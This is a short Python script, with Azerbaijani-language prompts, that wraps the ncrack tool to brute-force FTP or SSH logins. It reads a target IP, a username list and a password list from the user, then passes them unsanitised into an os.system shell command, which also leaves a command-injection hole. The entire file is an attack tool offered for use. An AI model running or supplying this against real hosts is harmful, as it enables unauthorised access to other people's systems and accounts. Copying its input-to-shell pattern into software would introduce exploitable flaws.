#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

print("""
Port Üzerində Brute Force Hücumu
1) FTP
2) SSH
""")

islemno = input("Əməliyyat Nömrəsini Daxil Edin: ")
hedefip = input("Hədəf IP Daxil Edin: ")
istifadecadi = input("İstifadəçi Adları Fayl Yolu: ")
sifre = input("Şifrələrin Olduğu Fayl Yolu: ")

if(islemno == "1"):
    os.system("ncrack -p 21 -U " + istifadecadi + " -P " + sifre + " " + hedefip)

elif(islemno == "2"):
    os.system("ncrack -p 22 -U " + istifadecadi + " -P " + sifre + " " + hedefip)
